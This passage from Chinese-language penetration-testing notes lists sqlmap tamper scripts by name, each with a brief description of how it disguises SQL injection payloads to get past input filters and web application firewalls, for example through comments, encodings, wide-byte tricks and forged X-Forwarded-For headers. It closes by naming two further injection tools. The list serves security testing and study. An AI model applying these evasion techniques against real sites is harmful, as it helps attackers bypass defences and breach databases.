9. charunicodeencode.py  // 对给定的payload的非编码字符使用UnicodeURL编码（不处理已经编码的字符）
10. concat2concatws.py  // 用“CONCAT WS(MID(CHAR(0), 0,0), A, B)”替换像“CONCAT(A,B)”的实例
11. equaltolike.py  // 用“LIKE"运算符替换全部等于号“=”
12. greatest.py  // 用“GREATEST”函数替换大于号“>”
13. halfversionedmorekeywords.py  // 在每个关键字之前添加MySQL注释
14. ifnull2ifisnull.py  // 用”IF(ISNULL(A), B, A)” 替换像 “IFNULL(A, B)” 的实例
15. lowercase.py  // 用小写值替换每个关键字字符
16. modsecurityversioned.py  // 用注释包围完整的查询
17. modsecurityzeroversioned.py  // 用当中带有数字零的注释包围完整的查询
18. multiplespaces.py  // 在SQL关键字周围添加多个空格
19. nonrecursivereplacement.py  // 用representations替换预定义SQL关键字，适用于过滤器
20. overlongutf8.py  // 转换给定的payload当中的所有字符
21. percentage.py  // 在每个字符之前添加一个百分号
22. randomcase.py  // 随机转换每个关键字字符的大小写
23. randomcomments.py  // 向SQL关键字中插入随机注释
24. securesphere.py  // 添加经过特殊构造的字符串
25. sp_password.py  // 向payload末尾添加'sp_password"for automatic obfuscation from DBMS logs
26. space2comment.py  // 用“/**/"替换空格符
27. space2dash.py  // 用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符
28. space2hash.py  // 用磅注释符“#“其次是一个随机子符串和个换行付替换空格符
29. space2morehash.py  // 用磅注释符“#其次是一个随机子符串和一个换行符替换空格符
30. space2mssqlblank.py  // 用一组有效的备选字符集当中的随机空白符替换空格行
31. space2mssqhash.py  // 用磅注释符“#"其次是一个换行符替换空格符
32. space2mysqlblank.py  // 中一组有效的备选字符集当中的随机空白符替换空格符
33. space2mysqldash.py  // 用破折号注释符“--”其次是一个换行符替换空格符
34. space2plus.py  // 用加号“+"替换空格符
35.  space2randomblank.py  // 用一组有效的备选字符集当中的随机空白符替换空格符
36. unionalltounion.py  // 用“UNION SELECT”替换“UNIONALL SELECT”
37. unmagicquotes.py  // 用一个多字节组合%bf%27和末尾通用注释一起替换空格符宽字节注入
38. varnish.py  // 添加一个HTTP头“X-originating-IP"来绕过WAF
39. versionedkeywords.py  // 用MySQL注释包围每个非函数关键字
40. versionedmorekeywords.py  // 用MySQL注释包围每个关键字
41. xforwardedfor.py  // 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF

### 一些其他的工具使用

- 超级SQL注入工具
- OracleShell